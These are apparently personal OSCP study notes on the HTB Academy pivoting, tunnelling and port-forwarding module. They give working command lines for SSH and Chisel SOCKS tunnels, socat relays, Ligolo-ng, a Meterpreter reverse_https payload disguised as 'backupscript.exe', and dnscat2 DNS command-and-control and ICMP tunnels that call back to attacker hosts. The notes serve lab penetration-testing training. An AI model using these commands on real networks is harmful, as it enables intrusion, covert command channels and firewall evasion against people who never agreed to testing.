---
layout: single
title:  "HTB Academy - Pivoting, Tunnelling and Port Forwarding"
categories: 
  - OSCP Notes
tags:
  - htb-academy
toc: true
toc_label: "Contents"
toc_icon: "list"  # corresponding Font Awesome icon name (without fa prefix)
excerpt: ""
permalink: /posts/pivoting-tunnelling-port-forwarding-notes
author_profile: false
sidebar:
  nav: "navbar"
---

## Basics

View all connected network interfaces using `ifconfig` or `ipconfig` (Windows).

* Alternatively, we can use the `ip address` command.

View routing tables using `netstat -r` or `ip route`.

## Port Forwarding with SSH and SOCKS Tunnelling

Consider a scenario where we want to access MySQL on a remote host, but we cannot do so directly from our attack host (Port 3306 is closed to us).

* One way to do this is to SSH into the server, then access MySQL from within the remote host.
* Another way is to port forward to our attack host on a specified port. This can be useful for the execution of remote exploits.

For example, if we want to port forward our port 1234 over SSH to MySQL on the remote host:  `ssh -L 1234:localhost:3306 ubuntu@10.129.202.64`.

* Here, the `-L` option tells the SSH client to request the SSH server forward all data from our port 1234 to port 3306 on the remote host (`localhost`). This allows us to access MySQL through port 1234 over SSH.
* Port forwarding syntax: `local port:server:host port`.
* When we do this, we start to listen on port 1234. This can be confirmed using `netstat` or `nmap` (scan `localhost`).

Dynamic Port Forwarding allows us to pivot our packets from our attack host to the target, through a pivot host/proxy.

* To do this, start a SOCKS listener on our attack host, then configure SSH to forward the traffic via SSH to the target after connecting to the pivot host.
* This is called SSH tunnelling over SOCKS proxy. This allows us to bypass firewall restrictions.

To enable dynamic port forwarding using SSH, we can use the `-D` option, along with our desired port: `ssh -D 9050 ubuntu@10.129.202.64`.

* This creates a SOCKS listener on our host, listening on port 9050.
* Subsequently, we can direct traffic over port 9050 and tunnel it to our target through SSH.

We can use `proxychains` to redirect TCP connections through SOCKS proxies.

* View configuration at `/etc/proxychains.conf`.
* Then, we can use `nmap` with `proxychains`, where we can scan an internal subnet through `proxychains`. Note that we can only do a full `TCP connect -sT` scan through `proxychains`. Additionally, `host-alive` checks may not work if ICMP echo requests are blocked (thus the `-Pn` option may need to be used).

Using `proxychains`, we can also use tools like `msfconsole` and `xfreerdp`.

## Remote/Reverse Port Forwarding with SSH

Suppose that we want to create a reverse shell to connect our attack host to an internal host through a pivot host. In this case, the internal host is a Windows machine.

* From the previous section, we can RDP in through the pivot host, but this may not be enough.

Firstly, create a Windows payload using `msfvenom`. In this case, set the listener IP address to the IP address of the pivot host, instead of our attack host:
`msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`

* Note that we want the pivot host to listen on port 8080, through `https`. We will then aim to forward traffic from port 8080 of the pivot host to a port on our attack host (e.g., 8000).

On our attack host, create a listener on port 8000:

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

Then, transfer our payload to the pivot host through `scp`. Use the Windows machine to download this payload from the pivot host through any method desired (e.g. HTTP).

Once the payload is on the remote target, we can use SSH remote port forwarding to forward connections from the pivot host to our attack host.

* Use the `-R` option to make the pivot host listen to the remote host on port 8080, and forward connections to our listener on port 8000:
  `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN`
* Use `-v` to have verbose output, and `-N` to not prompt the login shell.

Once the port forward is set up, execute the payload on the remote target. If all is set up correctly, we should see logs from the pivot host, and our reverse `meterpreter` session is created.

* `meterpreter` should show that the connection is coming from localhost, which is expected as the connection is received over the SSH socket. Using `netstat` shows that the connection is from SSH.

**IMPORTANT**: Recall that the reverse shell payloads come in either single-stage or multi-stage. Single-stage payloads can be caught by `netcat` as everything comes in on a single port, but multi-stage payloads will require the usage of the `multi/handler` to listen on multiple ports.

* When using `multi/handler`, ensure that the payload type is set correctly.

### Meterpreter Reverse Shell

On Linux, instead of using the traditional reverse shell method (using the `/dev/tcp` device), we can opt to use `meterpreter` instead, which offers tools like ping sweeps (`post/multi/gather/ping_sweep`).

* The ping sweep can also be done manually through a for-loop:
  `for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done`.
* cmd: `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"`
* PS: `1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}`
* Note: It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build it's arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.

Additionally, we can also perform TCP scans if ping probes are blocked. This can be done with `nmap` through port forwarding over SSH, or we can start a SOCKS proxy on our attack host using `msfconsole`.

* As long as a SOCKS proxy is up, we can use `proxychains`. Note that we may need to change the SOCKS version in the `proxychains` configuration file.
* Routing traffic via `meterpreter` will also require the use of the `post/multi/manage/autoroute` module.

Port forwarding can also be done using the `portfwd` module:
`portfwd add -l 3300 -p 3389 -r 172.16.5.19`

* Pre-requisite: a `meterpreter` session is active on the pivot host (i.e., reverse shell is active).
* This command makes the pivot host listen on port 3300, and forward traffic to the remote host on port 3389.

Reverse port forwarding: `portfwd add -R -l 8081 -p 1234 -L 10.10.14.18`.

* This command indicates reverse port forwarding, where the pivot host will forward all traffic on port 1234 to port 8081 of our attack host.
* This is useful when we execute a reverse shell on the remote host, and the pivot host listens on the port that ends up being forwarded back to our attack host.

## Socat Redirection

`socat` allows us to create pipe sockets between two network channels **without SSH tunnelling**.

* It redirects traffic from a listener to another IP address and port.

### Reverse Shell

`socat` needs to be run on the pivot host: `socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80`.

* Here, we set `socat` to listen on port 8080 and forward traffic to our attack host on port 80.

Then, set up a listener on our attack host, and run the `msfvenom` payload on our target to start the reverse shell.

### Bind Shell

Similarly, set up `socat`: `socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443`.

* Listen on port 8080 of our attack host, and forward packets to the target host on port 8443.

Then, create the bind shell payload for the target to listen on port 8443. Finally, set up the `multi/handler` on our attack host to establish a bind shell connection.

* Windows Bind shell payload: `windows/x64/meterpreter/bind_tcp`

## Pivoting Tools

### Plink (SSH Windows)

Plink (part of the PuTTY package) can be used for creating dynamic port forwards and SOCKS proxies:
`plink -ssh -D 9050 ubuntu@10.129.15.50`

After the dynamic port forward is created, we can use a tool called `Proxifier` to route our traffic (similar to `proxychains` on Linux).

### Sshuttle

`sshuttle` is an alternative to `proxychains`, but it only works for SSH pivoting (and not TOR/HTTPS).

* Useful for automating the execution of `iptables` and adding pivot rules.

We can run `sshuttle` and it will automatically create an `iptables` entry on our attack host:
`sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v`

* Use `-r` option to specify the remote host, and include the CIDR block of our target network through the pivot host.
* Once this is done, we can directly run commands like `nmap` without the need for `proxychains`, we just specify our target host (i.e., the private IP address) and port number.

### Windows Netsh

Port forwarding with `Netsh.exe`:

```cmd-session
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

* The port forward can be verified with `netsh.exe interface portproxy show v4tov4`

### Ligolo-ng

Set-up on attack host:

```
ip tuntap add user root mode tun ligolo  
ip link set ligolo up
```

* Run `ip a` to ensure that a `ligolo` interface is present.

Once a foothold is established on the pivot host, we transfer the `agent` binary to the pivot host.

Then, start the `proxy` on our attack host using `./proxy -selfcert`.  Note down the listening port (11601).

* Afterwards, start the `agent` binary using `./agent -connect <ip>:<port> -ignore-cert`.

On the attack host, connect to the active session using the `session` command.

Then, add a new route on the proxy using:
`ip route add <internal network CIDR block> dev ligolo`

Finally, start the session using `start`.

#### Double Pivoting

For double pivoting, download the agent on the second pivot server. Then, run this command to start a listener on the first pivot (this is done from the attack host):
`listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp`

* We can confirm that a listener is enabled if we run `listener_list`.

Then, run the agent on the second pivot, and set the connecting host as the first pivot.

* Ensure that the IP CIDR block used is correct. Use the same port 11601.

Once done, we should see a new session appear in the attack host (using `session`). Stop the current session and start the new session accordingly. This will give us a tunnel through the second pivot.

* Remember to update the `ip route` as well.

## DNS Tunnelling

Tool used - `dnscat2`.

* Uses an encrypted C2 channel and sends data through TXT records via DNS.
* Idea: Our attack host becomes a DNS server, and data is sent to our server under the guise of being a DNS query.

Start server with `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache`

* Note down the pre-shared secret which is generated.

Transfer the `dnscat2.ps1` file to the target, then run:

```powershell-session
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

Once a session is established, we can start an interactive shell session with `window -i 1`.

## SOCKS Tunnelling with Chisel

Transfers data over HTTP using SSH. We can transfer the `chisel` binary to our pivot host, then start the server there:
`./chisel server -v -p 1234 --socks5`

* It listens for incoming traffic on port 1234 over SOCKS, and forwards it to all internal networks which are accessible from the pivot host.

Now, from attack host, start a chisel client and connect to the pivot on port 1234:
`./chisel client -v 10.129.202.64:1234 socks`

Finally, we can use `proxychains` to use this SOCKS connection. Remember to modify the configuration file to route over port 1080 on SOCKS5:
`socks5 127.0.0.1 1080`

### Reverse SOCKS connection

To use a reverse connection, pass in the `--reverse` option to the server. Now, the server will listen for traffic and proxy them through the client.

* On our attack host: `sudo ./chisel server --reverse -v -p 1234 --socks5`
* On the pivot host: `./chisel client -v 10.10.14.17:1234 R:socks`

## ICMP Tunnelling

Similar to DNS tunnelling, ICMP tunnelling will encapsulate data within ICMP requests (echo and response). Note that this only works if ping requests are allowed.

Tool used: `ptunnel-ng`.

Transfer the binary to the pivot host, then start the server on the pivot side:
`sudo ./ptunnel-ng -r10.129.202.64 -R22`

* The `-r` option specifies the IP we want the server to accept connections on (in such cases, this would be the IP of the pivot host).

From attack host, connect to the server through port 2222:
`sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22`.

Once the ICMP tunnel is up, we can SSH to the target through port 2222.

* This allows us to have an SSH session through the ICMP tunnel.
* From here, we can also enable dynamic port forwarding.

Note that if we use the ICMP tunnel, then all network traffic captured will be marked as ICMP packets.

## Double Pivoting

For Windows, we can use `SocksOverRDP`.

* We will require the `SocksOverRDP` binaries, as well as `Proxifier` portable binaries.

For the first pivot host, we want to load `SocksOverRDP.dll` using `regsvr32.exe`:
`regsvr32.exe SocksOverRDP-Plugin.dll`

Then, connect to the second pivot host using `mstsc.exe` (RDP), and we will get a prompt that `SocksOverRDP` is enabled.

* Once connected to the second pivot host, transfer the `SocksOverRDP-Server.exe` and start it with administrative privileges.
* When this is done, we can verify that a listener has been started on our first pivot.

Finally, transfer `Proxifier` to our first pivot. When we start `mstsc.exe`, traffic is routed through `Proxifier` to our second pivot, and to our target host through `SocksOverRDP-server.exe`.

To improve `mstsc.exe` performance, we can use the `modem` setting.
